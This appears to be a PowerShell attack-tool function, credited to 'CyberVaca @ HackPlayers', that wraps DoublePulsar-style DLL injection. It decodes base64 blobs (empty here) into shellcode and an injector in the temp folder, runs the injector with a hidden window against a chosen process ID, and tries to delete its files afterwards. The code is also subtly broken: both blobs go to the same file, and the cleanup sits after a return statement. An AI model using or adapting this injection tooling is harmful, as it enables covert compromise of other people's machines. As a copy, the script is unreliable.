function doublepulsar {

param ([string]$DLL_Path,[int]$ProcessID)

$banner = @"
 ______             _     _        ______       _                   
(______)           | |   | |      (_____ \     | |                  
 _     _ ___  _   _| |__ | | _____ _____) )   _| |  ___ _____  ____ 
| |   | / _ \| | | |  _ \| || ___ |  ____/ | | | | /___|____ |/ ___)
| |__/ / |_| | |_| | |_) ) || ____| |    | |_| | ||___ / ___ | |    
|_____/ \___/|____/|____/ \_)_____)_|    |____/ \_|___/\_____|_|    
                                                                                                                                       
"@




$resultado = $banner
$resultado += "`n"
$resultado += "`n 				                 CyberVaca @ HackPlayers"
$ejecutable = ""
$binario = ""

function writeallbytes {param($path,$bytes)
$writer = [System.IO.File]::OpenWrite($path)
$writer.Write($bytes, 0, $bytes.Length)
$writer.Close()}


$process_name = (get-process | where-object {$_.id -like "$processID"} | select-object name).name ; $process_name = $process_name + ".exe"
$resultado += "`n[+] Inject DLL to the process $process_name"
$bytes = [System.Convert]::FromBase64String($binario) 
writeallbytes -path "$env:TEMP\shellcode.bin" -bytes $bytes
$bytes = [System.Convert]::FromBase64String($ejecutable) 
writeallbytes -path "$env:TEMP\shellcode.bin" -bytes $bytes

$proceso = "$env:TEMP\Double.exe" 
$argumentlist = " $ProcessID $env:temp\shellcode.bin $DLL_Path 1 True "
Start-Process $proceso -ArgumentList $argumentlist -WindowStyle Hidden| Wait-Process
$resultado += "`n[+] Removing temporary files..."
return $resultado
remove-item  "$env:temp\Double.exe"; remove-item "$env:temp\shellcode.bin"; remove-item $DLL_Path
}

